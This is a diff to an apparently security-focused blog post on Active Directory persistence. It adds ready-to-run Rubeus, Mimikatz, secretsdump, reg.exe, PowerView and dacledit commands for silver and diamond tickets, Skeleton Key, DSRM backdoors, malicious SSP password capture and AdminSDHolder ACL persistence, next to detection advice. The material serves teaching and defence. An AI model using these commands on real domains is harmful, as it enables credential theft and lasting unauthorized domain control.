@@ -85,13 +85,32 @@ A <Term concept="diamond-ticket">Diamond Ticket</Term> solves a different proble
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The first step is the only one that touches a domain controller, and it's a completely ordinary authentication, indistinguishable from any other logon.</p>
 </div>
 
-Current tooling: Rubeus's `golden`, `silver`, and `diamond` modules cover all three, with `/ldap` and `/opsec` flags on the newer `diamond` implementation specifically built to match real Windows AS-REQ/AS-REP behavior and pull realistic PAC values, closing the gap that made earlier diamond tickets detectable too.
+**Requirements:** a Silver Ticket needs only the target service account's password hash, not krbtgt, and never needs Domain Admin if that one hash is already in hand. A Diamond Ticket needs krbtgt's hash plus a valid account to request the initial real TGT from, the same prerequisite as a Golden Ticket.
+
+```bash
+# Silver Ticket: forge a TGS directly from a service account's hash, no KDC involved
+Rubeus.exe silver /service:cifs/fileserver.$DOMAIN /rc4:$SERVICE_HASH /user:anyuser /domain:$DOMAIN /sid:$DOMAIN_SID /ptt
+
+# Diamond Ticket: starts from a real TGT, edits it, re-encrypts with krbtgt's hash
+Rubeus.exe diamond /tgtdeleg /ticketuser:anyuser /ticketuserid:1234 /groups:512 /krbkey:$KRBTGT_HASH /domain:$DOMAIN /dc:$TARGET_DC /opsec /ptt
+```
+
+The `/ldap` and `/opsec` flags on the newer `diamond` implementation are specifically built to match real Windows AS-REQ/AS-REP behavior and pull realistic PAC values, closing the gap that made earlier diamond tickets detectable too.
 
 **Detection.** Silver Tickets are the hardest of the three by default, precisely because no KDC event exists to alert on; the one server-side control that catches them is setting `ValidateKdcPacSignature` to require domain controllers to validate the PAC signature on presented tickets, which a forged Silver Ticket won't have. Diamond Tickets are caught the same way Golden Tickets sometimes aren't: since the initial TGT request is completely ordinary, detection has to focus on what happens after, unexpected group membership appearing in a ticket's PAC relative to what the account actually holds in AD, which requires correlating ticket contents against the directory rather than looking for anomalies in the ticket request itself.
 
 ## The Skeleton Key: One Password, Every Account
 
 The <Term concept="skeleton-key">Skeleton Key</Term> takes a completely different approach: instead of forging tickets, it patches the authentication code path directly, in memory, on a domain controller. With Domain Admin rights and `SeDebugPrivilege`, Mimikatz's `misc::skeleton` injects into `lsass.exe` on the target DC, downgrades Kerberos encryption to RC4 for that authentication path, and installs a single master password that works alongside every account's real password, for every account in the domain, without changing anyone's actual password.
+
+**Requirements:** Domain Admin (or equivalent) and `SeDebugPrivilege` on the target domain controller, since injecting into that DC's `lsass.exe` is the entire mechanism.
+
+```bash
+mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
+
+# from that point, any account authenticates domain-wide with its real password or:
+net use \\fileserver\share /user:anyuser Mimikatz
+```
 
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
   <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A four-step horizontal chain for the Skeleton Key attack: Domain Admin rights and SeDebugPrivilege are used to patch lsass.exe in memory on a domain controller, Kerberos encryption is downgraded to RC4 for that authentication path, a master password is installed alongside every account's real password, and any account can then authenticate domain-wide with its real password or the master password until the domain controller reboots." >
@@ -124,6 +143,19 @@ The <Term concept="skeleton-key">Skeleton Key</Term> takes a completely differen
 ## DSRM: The Backdoor Nobody Thinks of as an AD Object
 
 Every domain controller has a <Term concept="dsrm">DSRM</Term> (Directory Services Restore Mode) local Administrator account, with a password set once at DC promotion and, in most environments, never rotated again. Normally that account only matters when the DC is booted into DSRM for database repair. The registry value `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` controls when it can be used more broadly: `0` (default) restricts it to DSRM boot, `1` allows it if the AD DS service is stopped, and `2`, which doesn't exist by default and has to be created, allows it to authenticate over the network at any time, like an ordinary local administrator on that DC.
+
+**Requirements:** Domain Admin (or local admin on the DC itself) to read or reset the DSRM password and to set the registry value in the first place.
+
+```bash
+# extract the DSRM local admin hash from the DC's own SAM
+secretsdump.py -just-dc-user Administrator $DOMAIN/$USER:$PASSWORD@$TARGET_DC
+
+# set the registry value that allows network logon
+reg.exe add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
+
+# authenticate as the DSRM account, over the network, going forward
+netexec smb $TARGET_DC -u Administrator -H $DSRM_HASH --local-auth
+```
 
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
   <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A four-step horizontal chain for DSRM persistence: a domain controller's DSRM local administrator password, set once at promotion and rarely rotated, is extracted or reset by an attacker, the DsrmAdminLogonBehavior registry value is set to 2, and the DSRM account can then authenticate over the network like an ordinary local admin, surviving a full domain password reset because it is a local account rather than an Active Directory object." >
@@ -183,7 +215,23 @@ Windows loads Security Support Provider DLLs into LSASS at boot to handle each s
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Registered on a domain controller, this quietly captures the plaintext password of every user who authenticates against that DC from that point on.</p>
 </div>
 
-Two variants exist, and they trade persistence for stealth in opposite directions from each other: dropping Mimikatz's `mimilib.dll` and adding it to the registry survives a reboot but leaves a file and a registry change behind; Mimikatz's `misc::memssp` patches a running LSASS directly with no reboot and no file dropped, but the injection doesn't survive one either. **Detection:** monitor the `Security Packages` registry value for unexpected additions (**event 4657** for the change itself), and treat any unsigned or unexpected DLL loaded into `lsass.exe`, visible via Sysmon **event 7** (ImageLoad), as worth investigating on sight.
+Two variants exist, and they trade persistence for stealth in opposite directions from each other: dropping Mimikatz's `mimilib.dll` and adding it to the registry survives a reboot but leaves a file and a registry change behind; Mimikatz's `misc::memssp` patches a running LSASS directly with no reboot and no file dropped, but the injection doesn't survive one either.
+
+**Requirements:** Domain Admin (or local admin) on the target host, ideally a domain controller, to write `mimilib.dll` and its registry entry, or `SeDebugPrivilege` for the in-memory-only variant.
+
+```bash
+# persistent, survives reboot: drop the DLL and register it, then reboot or restart LSA
+copy mimilib.dll C:\Windows\System32\
+reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0mimilib" /f
+
+# in-memory only, no reboot needed, doesn't survive one either
+mimikatz.exe "privilege::debug" "misc::memssp" "exit"
+
+# captured credentials land in, by default:
+type C:\Windows\System32\kiwissp.log
+```
+
+**Detection:** monitor the `Security Packages` registry value for unexpected additions (**event 4657** for the change itself), and treat any unsigned or unexpected DLL loaded into `lsass.exe`, visible via Sysmon **event 7** (ImageLoad), as worth investigating on sight.
 
 ## ACL-Based Persistence: AdminSDHolder and the Permission That Comes Back
 
@@ -219,6 +267,18 @@ Every technique so far forges or patches something. This one just grants a permi
 </div>
 
 The same idea generalizes past AdminSDHolder: granting a low-privileged, easy-to-overlook account `WriteDACL` on an OU, `GenericAll` on a GPO, or, quietest of all, Replicating Directory Changes rights directly (skipping the need for any ticket forgery at all, straight to Part 3's DCSync) are all durable persistence, because none of them require a credential at all, only a standing permission nobody happened to be looking for.
+
+**Requirements:** `WriteDACL` (or equivalent) on AdminSDHolder itself, which in turn usually requires having already reached Domain Admin or an equivalent high-privilege account at least once, exactly the moment this technique is meant to be planted in.
+
+```bash
+# grant a low-privileged account GenericAll on AdminSDHolder, PowerView-style
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=com' -PrincipalIdentity lowpriv-user -Rights All
+
+# or with Impacket's dacledit.py, from Linux
+dacledit.py -action write -rights FullControl -principal lowpriv-user -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=com' $DOMAIN/$USER:$PASSWORD
+```
+
+The ACE rides SDProp onto every protected group's members on the next cycle, without ever forging a ticket.
 
 **Detection.** **Event 5136** (a directory service object was modified) on the AdminSDHolder object itself is rare enough in legitimate operation to be a very high-fidelity alert, and it's worth a permanent SACL specifically for that reason. More broadly, a scheduled BloodHound run against the domain's own ACLs, the same defensive habit recommended in Part 1 and Part 3, is what actually catches the general pattern: a low-privileged principal holding a dangerous ACE on a high-value object, whether or not that object happens to be AdminSDHolder specifically.
 
@@ -261,3 +321,5 @@ None of these techniques need to be re-discovered to be re-used. That's the actu
 	The tool behind the golden, silver, and diamond modules referenced throughout.
 11. "Active Directory Series: Part 3 - From Enumeration to Privilege Escalation" (this blog). [/posts/active-directory-security-part3](/posts/active-directory-security-part3)
 	The full Golden Ticket and DCSync mechanics this post builds on rather than repeating.
+12. The Hacker Recipes, "Active Directory: Persistence." [https://www.thehacker.recipes/ad/persistence/](https://www.thehacker.recipes/ad/persistence/)
+	A command-level reference for AD persistence techniques, used as a structural model for the requirements lines and command blocks added throughout this post.
